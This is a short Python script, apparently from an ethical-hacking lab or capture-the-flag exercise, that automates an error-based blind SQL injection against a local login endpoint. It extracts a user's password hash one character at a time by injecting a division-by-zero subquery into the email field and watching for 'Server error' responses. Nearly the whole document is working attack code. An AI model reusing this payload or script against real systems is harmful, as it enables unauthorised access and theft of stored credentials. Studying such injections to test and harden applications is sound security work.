import requests

BASE_URL = 'http://localhost:9007'

characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

hashed_password = ''

for i in range(65):
    for c in characters:
        payload = f"' AND (SELECT 1/((SELECT ASCII(SUBSTR(password,{i},1)) FROM users WHERE email='kelompok8@ethack.id') - ASCII('{c}'))) IS NULL AND ''='"
        data = { 'email':  payload, 'password': ''}
        response = requests.post(f'{BASE_URL}/auth/login', data)
        if 'Server error' in response.text:
            hashed_password += c
            print(f'Current password: {hashed_password}')
            break
        
print(f'Found Password: {hashed_password}')